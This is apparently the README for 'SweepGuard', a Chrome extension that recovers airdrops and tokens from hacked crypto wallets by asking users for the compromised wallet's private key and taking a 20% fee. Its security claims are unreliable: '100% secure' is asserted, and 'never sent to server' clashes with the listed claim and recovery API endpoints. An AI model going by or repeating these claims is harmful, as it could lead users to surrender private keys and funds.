# SweepGuard Chrome Extension v2.0

## 🛡️ Wallet Protector — Claim Airdrops Safely

### Features

- 🎯 **Auto-detect claim pages** — Automatically finds airdrop claim pages
- 💰 **80/20 split** — 80% to your safe wallet, 20% platform fee
- 🔐 **Flashbots atomic bundles** — 100% secure, drainer can't intercept
- 👻 **Stealth mode** — Hacker can't detect the extension
- 🔗 **15 chains** — Ethereum, Base, BSC, Arbitrum, Polygon, Optimism, and more
- 🖼️ **NFT support** — Claim NFTs with 0% fee
- 💸 **Balance transfer** — Move tokens from compromised wallet to safe wallet
- 💾 **Local storage** — Wallet info saved locally, never sent to server

### Installation

1. Download the `extension/` folder
2. Open Chrome → `chrome://extensions/`
3. Enable "Developer mode" (top right)
4. Click "Load unpacked"
5. Select the `extension/` folder
6. SweepGuard icon appears in toolbar!

### Usage

#### Claim Airdrop
1. Navigate to an airdrop claim page
2. Click SweepGuard icon
3. Enter your wallets:
   - 🔴 **Compromised Wallet** — Private key of hacked wallet
   - 🟢 **Safe Wallet** — Where tokens will be sent
   - 💰 **Sponsor Wallet** — Wallet with ETH for gas
4. Select the chain
5. Click "Claim Airdrop"
6. Done! 80% → safe wallet, 20% → platform fee

#### Transfer Tokens
1. Go to "Transfer" tab
2. Enter token address (or leave blank for ETH)
3. Enter amount (or "all")
4. Click "Transfer to Safe Wallet"

#### Claim NFTs
1. Go to "NFT" tab
2. Enter NFT contract address
3. Enter recipient (safe wallet)
4. Click "Claim NFT"
5. **0% fee for NFTs!**

### How It Works

```
Block N (Flashbots Atomic Bundle):
├── TX1: Sponsor → Compromised Wallet (gas)
├── TX2: Compromised Wallet → FeeCollector (claim)
│   └── Contract automatically:
│       ├── 80% → User's Safe Wallet ✅
│       └── 20% → Abir's Wallet 💰
└── Drainer: "Ki hoilo? Kichu dekhlam na!" 😵
```

### Security

- ✅ Private keys stored locally only
- ✅ Flashbots private mempool
- ✅ Atomic bundles — all or nothing
- ✅ Smart contract enforced 80/20 split
- ✅ Stealth mode — no traces

### Supported Chains

| Chain | Chain ID | Status |
|-------|----------|--------|
| Ethereum | 1 | ✅ |
| Base | 8453 | ✅ |
| BNB Chain | 56 | ✅ |
| Arbitrum | 42161 | ✅ |
| Polygon | 137 | ✅ |
| Optimism | 10 | ✅ |
| Avalanche | 43114 | ✅ |
| Fantom | 250 | ✅ |
| Cronos | 25 | ✅ |
| Blast | 81457 | ✅ |
| Zora | 7777777 | ✅ |
| Polygon zkEVM | 1101 | ✅ |
| Manta Pacific | 169 | ✅ |
| zkSync Era | 324 | ✅ |
| Linea | 59144 | ✅ |

### Files

```
extension/
├── manifest.json      # Extension manifest (MV3)
├── popup.html         # Popup UI
├── popup.js           # Popup logic
├── background.js      # Background service worker
├── content.js         # Content script (page injection)
├── content.css        # Content styles
├── injected.js        # Web3 provider injection
├── icons/
│   ├── icon.svg       # SVG icon
│   ├── icon16.png     # 16x16 icon
│   ├── icon48.png     # 48x48 icon
│   └── icon128.png    # 128x128 icon
└── README.md          # This file
```

### API Integration

Extension communicates with SweepGuard API:
- `POST /api/airdrop/claim` — Claim airdrops
- `POST /api/recover` — Transfer tokens
- `GET /api/scan` — Scan wallet

### Development

```bash
# Load extension
1. Open chrome://extensions/
2. Enable Developer mode
3. Click "Load unpacked"
4. Select extension/ folder

# Debug
- Right-click extension icon → "Inspect popup"
- chrome://extensions/ → "Service worker" link
- Content script: F12 → Console
```

### License

MIT — SweepGuard 2026

---

🛡️ **SweepGuard** — Protecting wallets worldwide
💰 **Passive income** — 20% fee on every claim
🌍 **Global** — 15 chains, unlimited users
